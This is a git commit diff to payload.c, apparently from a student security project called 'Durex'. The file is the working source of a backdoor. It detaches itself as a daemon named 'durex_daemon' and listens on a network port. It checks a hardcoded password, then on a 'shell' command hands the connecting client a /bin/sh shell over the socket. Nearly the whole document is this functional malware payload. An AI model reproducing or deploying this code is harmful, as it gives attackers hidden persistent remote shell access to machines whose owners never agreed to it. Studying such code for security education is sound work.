f53661d5824ce70b80eef0aae807f0983daafe4e
eparisot <eparisot@student.42.fr>
2021-05-26 00:21:19 +0200

    simpler daemon

--- payload/srcs/payload.c
+++ payload/srcs/payload.c
@@ -12,7 +12,7 @@
 
 #include "../includes/payload.h"
 
-int daemonize(char* name, char* path, char* outfile, char* errfile, char* infile)
+int daemonize(char* name, char* path)
 {
 	pid_t pid;
 
@@ -24,104 +24,78 @@ int daemonize(char* name, char* path, char* outfile, char* errfile, char* infile
 	{ 
 		name="durex_daemon"; 
 	}
-	if (!infile) 
-	{ 
-		infile="/dev/null"; 
-	}
-    if (!outfile) 
-	{ 
-		outfile="/dev/null"; 
-	}
-    if (!errfile) 
-	{ 
-		errfile="/dev/null"; 
-	}
 
-    /* Fork off the parent process */
+    // Fork off the parent process
     pid = fork();
 
-    /* An error occurred */
+    // An error occurred
     if (pid < 0)
         exit(EXIT_FAILURE);
 
-    /* Success: Let the parent terminate */
+    // Success: Let the parent terminate
     if (pid > 0)
         exit(EXIT_SUCCESS);
 
-    /* On success: The child process becomes session leader */
+    // On success: The child process becomes session leader
     if (setsid() < 0)
         exit(EXIT_FAILURE);
 
-    /* Catch, ignore and handle signals */
-    //TODO: Implement a working signal handler */
+    // Catch, ignore and handle signals
+    //TODO: Implement a working signal handler
     signal(SIGCHLD, SIG_IGN);
     signal(SIGHUP, SIG_IGN);
 
-    /* Fork off for the second time*/
-    pid = fork();
-
-    /* An error occurred */
-    if (pid < 0)
-        exit(EXIT_FAILURE);
-
-    /* Success: Let the parent terminate */
+    // Success: Let the parent terminate
     if (pid > 0)
         exit(EXIT_SUCCESS);
 
-    /* Set new file permissions */
+    // Set new file permissions
     umask(0);
 
-    /* Change the working directory to the root directory */
-    /* or another appropriated directory */
+    // Change the working directory to the root directory
     if (chdir("/"))
 		exit(EXIT_FAILURE);
 
 	//Close all open file descriptors
-    int fd;
-    for( fd=sysconf(_SC_OPEN_MAX); fd>0; --fd )
-    {
-        close(fd);
-    }
-
-	//reopen stdin, stdout, stderr
-    stdin=fopen(infile,"r");   //fd=0
-    stdout=fopen(outfile,"w+");  //fd=1
-    stderr=fopen(errfile,"w+");  //fd=2
+    close(0);
+	close(1);
+	close(2);
 
 	return 0;
 }
 
-int r_shell()
+int r_shell(void)
 {
 	struct sockaddr_in server_address;
     int server_socket;
 	int opt = 1;
 
+	// set the server address
     server_address.sin_family = AF_INET;
     server_address.sin_addr.s_addr = INADDR_ANY;
     server_address.sin_port = htons(REMOTE_PORT);
-
+	// open socket
     server_socket = socket(AF_INET, SOCK_STREAM, 0);
 	if (server_socket < 0)
 	{
 		printf("error opening socket\n");
 		return -1;
 	}
-
+	// set socket options
 	if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
     {
         printf("error setting socket options\n");
 		close(server_socket);
         return -1;
     }
-
+	// bind socket to if
     if (bind(server_socket, (const struct sockaddr *)&server_address, sizeof(server_address)))
 	{
 		printf("error binding socket\n");
 		close(server_socket);
         return -1;
 	}
-
+	// listen for connexions
 	if (listen(server_socket, 3) < 0)
 	{
 		printf("error listening socket\n");
@@ -133,43 +107,59 @@ int r_shell()
 	socklen_t client_addr_asize;
 	int client_socket;
 	char buffer[1024] = {0};
-	char hello_msg[] = "Hello !\n";
-
+	char hello_msg[] = "Welcome !\npassword: ";
+	char conn_refused_msg[] = "Connexion refused\n";
+	// accept client connexion and ask password
 	if ((client_socket = accept(server_socket, (struct sockaddr *)&client_address, &client_addr_asize)) < 0)
     {
         printf("error accepting socket connexion\n");
         close(server_socket);
         return -1;
     }
-	
-    send(client_socket , hello_msg , strlen(hello_msg) , 0 );
-    printf("Hello message sent\n");
-
+    send(client_socket , hello_msg , strlen(hello_msg) , 0);
+	// check password
 	if (read(client_socket , buffer, 1024) < 0)
 	{
 		printf("error reading socket content\n");
         close(server_socket);
         return -1;
 	}
-	//printf("%s", buffer);
+	if (strncmp(buffer, "pass", 4))
+	{
+		send(client_socket , conn_refused_msg , strlen(conn_refused_msg) , 0);
+		close(server_socket);
+		close(client_socket);
+		return 0;
+	}
+	// wait for "shell\n" command
+	if (read(client_socket , buffer, 1024) < 0)
+	{
+		printf("error reading socket content\n");
+        close(server_socket);
+        return -1;
+	}
 	if (strncmp(buffer, "shell", 5) == 0)
 	{
-		printf("Starting reverse shell\n");
+		// Start reverse shell
 		dup2(client_socket, 0);
 		dup2(client_socket, 1);
 		dup2(client_socket, 2);
 		char * const argv[] = {"/bin/sh", NULL};
     	execve("/bin/sh", argv, NULL);
+		
 	}
-
 	close(client_socket);
 	close(server_socket);
+	if (strncmp(buffer, "stop", 4) == 0)
+	{
+		return 1;
+	}
 	return 0;
 }
 
 int main(void)
 {
-	if (daemonize("durex_daemon", "/", "/dev/fd/1", "/dev/fd/2", "/dev/fd/0"))
+	if (daemonize("durex_daemon", "/"))
 	{
 		printf("Failed to run daemon\n");
 		return EXIT_FAILURE;
@@ -177,11 +167,9 @@ int main(void)
 
 	while (1)
 	{
-		r_shell();
-		break;
+		if (r_shell() != 0)
+			break;
+		sleep(1);
 	}
-
-	printf("durex stopped\n");
-	
 	return EXIT_SUCCESS;
 }
